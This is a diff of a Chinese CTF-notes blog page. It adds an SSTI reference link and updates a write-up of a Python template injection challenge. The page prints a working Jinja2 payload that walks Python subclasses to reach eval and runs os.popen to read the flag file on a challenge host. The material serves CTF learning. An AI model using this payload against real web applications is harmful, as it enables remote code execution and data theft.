@@ -204,7 +204,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/CTF笔记/">
-                    CTF笔记 <span class="right">11 篇</span></a>
+                    CTF笔记 <span class="right">13 篇</span></a>
                 </a>
             </li>
 
@@ -365,11 +365,12 @@
 <h3 id="5、python-template-injection"><a href="#5、python-template-injection" class="headerlink" title="5、python template injection"></a>5、python template injection</h3><p>此题属于SSTI（Server-Side Template Injection），这种模板为了防止代码任意执行的问题设置了沙盒机制，但是还是有办法绕过，绕过方法见下面payload。（个人猜想）</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
 <p>讲解SSTI：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/9415641.html">https://www.cnblogs.com/tr1ple/p/9415641.html</a></p>
+<p>CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93746437">https://zhuanlan.zhihu.com/p/93746437</a></p>
 <p><strong>Python类的特殊属性</strong>：<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#special-attributes">https://docs.python.org/zh-cn/3.7/library/stdtypes.html#special-attributes</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">instance.__class__ 可以获取当前实例的类对象</span><br><span class="line">class.__base__    获取类的基类</span><br><span class="line">class.__bases__    获取元组形式的类的基类</span><br><span class="line">class.__mro__ 获得包括当前类的所有父类元组（可理解为一步一步解析找到基类）</span><br><span class="line">class.__subclasses__()    获得该类的所有子类</span><br></pre></td></tr></table></figure>
 
 <p><strong>Payload：</strong></p>
-<p>为了代码执行，我们需要使用os模块中的函数。<code>http://220.249.52.133:42543/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>可获得所有的类。os模块都是从warnings.catch_warnings类入手的，在所有模块中查找warnings.catch_warnings的位置，为第59个……详见XCTF题解</p>
+<p>为了代码执行，我们需要使用os模块中的函数。<code>http://220.249.52.133:42543/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>可获得所有的类。os模块都是从warnings.catch_warnings类入手的，在所有模块中查找warnings.catch_warnings的位置，为第134个……详见XCTF题解</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span>:<span class="number">42543</span>/&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat fl4g&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>SSTI注入工具</strong>：</p>
